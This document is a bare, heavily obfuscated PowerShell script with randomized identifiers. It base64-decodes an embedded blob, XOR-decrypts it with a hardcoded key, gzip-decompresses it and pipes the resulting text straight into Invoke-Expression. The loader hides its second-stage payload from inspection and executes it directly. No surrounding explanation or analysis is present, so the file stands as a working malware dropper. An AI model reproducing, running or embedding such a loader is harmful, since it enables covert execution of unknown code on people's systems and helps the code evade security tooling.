$fbid6zgn10a5uk2 = [System.Text.Encoding]::ascii
function mwolni40s75pdfc1ehja3uxtq2k  {param($9f6no1cqek73rgm )
  $omxlh5w2jzevpgy = [System.Convert]::FromBase64String($9f6no1cqek73rgm)
  $4g9pfnrhda5i1zt= $fbid6zgn10a5uk2.GetBytes("sc26hqe39zd7")
    $bk5n67hvlr42z9y = $omxlh5w2jzevpgy
    $hxqzdclime5gupf = $(for ($wrvc0lmze2kjyth = 0; $wrvc0lmze2kjyth -lt $bk5n67hvlr42z9y.length; ) {
        for ($gw0q6vuc1mo4p39 = 0; $gw0q6vuc1mo4p39 -lt $4g9pfnrhda5i1zt.length; $gw0q6vuc1mo4p39++) {
            $bk5n67hvlr42z9y[$wrvc0lmze2kjyth] -bxor $4g9pfnrhda5i1zt[$gw0q6vuc1mo4p39]
            $wrvc0lmze2kjyth++
            if ($wrvc0lmze2kjyth -ge $bk5n67hvlr42z9y.Length) {
                $gw0q6vuc1mo4p39 = $4g9pfnrhda5i1zt.length
            }
        }
    })
	$osl57btecmu9pgw = New-Object System.IO.MemoryStream( , $hxqzdclime5gupf )

	    $fygmjwivd16hb80 = New-Object System.IO.MemoryStream
        $25fct8nvl93izd0 = New-Object System.IO.Compression.GzipStream $osl57btecmu9pgw, ([IO.Compression.CompressionMode]::Decompress)
	    $25fct8nvl93izd0.CopyTo( $fygmjwivd16hb80 )
        $25fct8nvl93izd0.Close()
		$osl57btecmu9pgw.Close()
		[byte[]] $n8v6dhfolagptqc = $fygmjwivd16hb80.ToArray()
 $18ltedsx4uyh5wj=$n8v6dhfolagptqc
    return $18ltedsx4uyh5wj
}
[byte[]]$xfqd0k4wlon5abv=mwolni40s75pdfc1ehja3uxtq2k $i1je0oghlvqpb8r
[System.Text.Encoding]::ascii.GetString((mwolni40s75pdfc1ehja3uxtq2k "bOg6NmhxZTM9euliHhCRAHiPOVXBdX467oPIVtiSgaldiKXB4qdfqo60tojv7d2mMmXrFuBhBRTMBYvFkafzwUlBZluMAJLuFDRwYzzJghpOXu8POT8EqdmlKCJDK3EzJC82Px1cb2S4BfBAZKwGvdWEQpe8Lp6mqMmOguwJzNwoDuqRfIh25LjttaYNF4pzXYDs1YFYLC//ti8ddAh7JXV2qa5ChOhkr0kaIkAd68cjbX3DegKkyobfmD+OEFZS22WnuewN9TEVgLJYa5K+PGFvchEzfUCWtN7ok+GvzyDlFl1dwIYjCZadArLRD/t4TXeM/BB+3zVdWJFLoWASe/c2ZxfxP4JvMpt+jaO0P8kJGfmWTsgj/lVHA3OAXZkEpyEJpD3ZO10EZwOeoGqRaBQJN5AP10FdLq5lgs4m3s43hQONP/hOKflAPjKoV5yDepnqNgTdCoTmtfP6wcS7cZ9E3B2Kogdrdbolk/mNngaizQXKykqJwb3NNv62DIFBOr49jScwABnBUcydH7fFzR21dnq7OjFp2ervjeogcH4plKr4BgceFK7gy2iSOa8DkhrgdAXVRljskXDU0J1ESjT/WvDBRWBz/hhyvioVaZCtMbDeUdPNvDbX63z92ZJUoCGXPLJNQ3aCGOnFn/f2hyNVnG38vc4lXT40w0fsGxrE5+RmXVo735Ewi3SwRgwo6xd3OTw0tQPz0qV3Mjfwe4SAiMTmtlze5ygxEEk/7Ia0qqLRQOhDB/V6PVst8ixsvvxuXbG65rsm6z1hxOALvwKM5Mk6nmyw8WcA/tBcF/N8eui7zCqi5FV9AV/S8+6KLgtvHIbJEEnJNzjg689RvGTjQQelfw+zmO0qy202NSsy4EBnN5CwM1xYAsOg0CgswJyATmZ/tQvPMG7VuyrGs2GbrXuVj+7RVDcZtzNx5UWc0Xh9EEJBW8QFWt8vIAfHCsgxmFL3H+P5FVs0j6RC8q9srinmozsZdN65vZa53/2ksU/Y7AzxDbPIOB/+B6uNxYzdmrkMl97zsZuDZJW/C9i3mO/Qp2hx5JvfCj/kXfmQMhgtd+vh6nBwyGgovxQd3NQn9tCRZBxdpmQE945n+mxhENssbpKCS9uKgPXB9npI066/FLKgLDcyU51GVuGP2seQMl0QeXO4qjPxfNgNtuty3+Qo/eYlembePUd8ZMWjO1vKXzeH16K8rJkkAzKujWQGanR7OjQ5eg=="))|iex;